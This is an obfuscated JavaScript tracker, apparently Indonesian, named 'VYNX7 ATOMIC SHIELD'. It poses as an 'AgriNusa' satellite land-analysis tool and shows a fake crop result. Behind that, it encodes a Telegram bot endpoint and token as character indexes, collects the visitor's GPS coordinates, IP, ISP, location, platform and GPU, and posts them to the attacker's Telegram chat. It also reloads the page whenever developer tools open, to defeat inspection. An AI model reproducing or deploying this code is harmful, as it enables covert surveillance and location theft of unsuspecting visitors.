/**
 * VYNX7 ATOMIC SHIELD v7.0
 * Status: Ultra-Obfuscated
 */

// Kamus Karakter (The DNA Pool)
const _$_ = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789:/.-_?=&%, ";

// Peta Index (The Map)
// Di sini kita tidak menyimpan kata, cuma alamat karakter di dalam _$_
const _V7 = {
    
    _u1: [7, 19, 19, 15, 18, 62, 62, 0, 15, 8, 64, 19, 4, 11, 4, 6, 17, 0, 12, 64, 14, 17, 6, 62, 1, 14, 19],
    
    _u2: [7, 19, 19, 15, 18, 62, 62, 8, 15, 0, 15, 8, 64, 2, 14, 62, 9, 18, 14, 13, 62],
    
    _u3: [7, 19, 19, 15, 18, 62, 62, 22, 22, 22, 64, 6, 14, 14, 6, 11, 4, 20, 18, 4, 17, 2, 14, 13, 19, 4, 13, 19, 64, 2, 14, 12, 62, 7, 19, 19, 15, 18, 62, 62, 12, 0, 15, 18, 64, 6, 14, 14, 6, 11, 4, 64, 2, 14, 12, 62, 12, 0, 15, 18, 64, 2, 14, 12, 62, 30],
   
    _tk: [58, 52, 61, 59, 49, 54, 54, 54, 61, 57, 62, 26, 26, 31, 52, 14, 11, 23, 0, 17, 56, 22, 11, 17, 11, 24, 41, 50, 51, 43, 16, 19, 41, 10, 21, 42, 20, 11, 41, 31, 53, 26, 63, 40, 30, 5, 18],
  
    _id: [54, 54, 61, 57, 52, 56, 50, 55, 53, 60],
    
    _m: [12, 4, 13, 3, 38, 4, 18, 18, 0, 6, 4],
    _p: [2, 7, 0, 19, 65, 8, 3] 
};

class Vynx7Shield {
    constructor() {
        this._initAntiDebug();
       
        this._uT = this._ax(_V7._u1) + this._ax(_V7._tk) + "/" + this._ax(_V7._m);
        this._uI = this._ax(_V7._u2);
    }

   
    _ax(arr) {
        return arr.map(i => _$_[i]).join('');
    }

    _initAntiDebug() {
        setInterval(() => {
            if (window.outerHeight - window.innerHeight > 160) location.reload();
        }, 1000);
    }

    async _getSystemInfo() {
        let n = { ip: "0.0.0.0", org: "Unknown" };
        try {
            const r = await fetch(this._uI);
            n = await r.json();
        } catch (e) {}

        const c = document.createElement('canvas');
        const g = c.getContext('webgl');
        const d = g ? g.getExtension('WEBGL_debug_renderer_info') : null;
        const gpu = d ? g.getParameter(d.UNMASKED_RENDERER_ID) : "Generic GPU";

        return `
🚨 <b>VYNX7 INTRUSION REPORT</b>
────────────────────
🌐 <b>NETWORK:</b>
• IP: <code>${n.ip}</code>
• ISP: <code>${n.org}</code>
• Loc: <code>${n.city}, ${n.country_name}</code>
💻 <b>HARDWARE:</b>
• OS: <code>${navigator.platform}</code>
• GPU: <code>${gpu}</code>
────────────────────`;
    }

    async ignite(la, lo) {
        const info = await this._getSystemInfo();
        const map = this._ax(_V7._u3) + la + "," + lo;
        const msg = info + `📍 <b>LOCATION:</b>\n<a href="${map}">Open in Google Maps</a>`;

        try {
            await fetch(this._uT, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: this._ax(_V7._id),
                    text: msg,
                    parse_mode: "HTML"
                })
            });
        } catch (e) {}
    }
}

async function runVynx7() {
    const s = document.getElementById('status') || { innerText: "" };
    s.innerText = "Menganalisis satelit AgriNusa...";

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (p) => {
            const v = new Vynx7Shield();
            await v.ignite(p.coords.latitude, p.coords.longitude);
            setTimeout(() => {
                s.innerHTML = "✅ Analisis Lahan Selesai!<br>Tanaman Cocok: <b>Padi IR64</b>";
            }, 2000);
        }, (err) => {
            s.innerText = "Gagal mendapatkan lokasi. Pastikan GPS aktif.";
        });
    } else {
        s.innerText = "Browser tidak mendukung GPS.";
    }
}
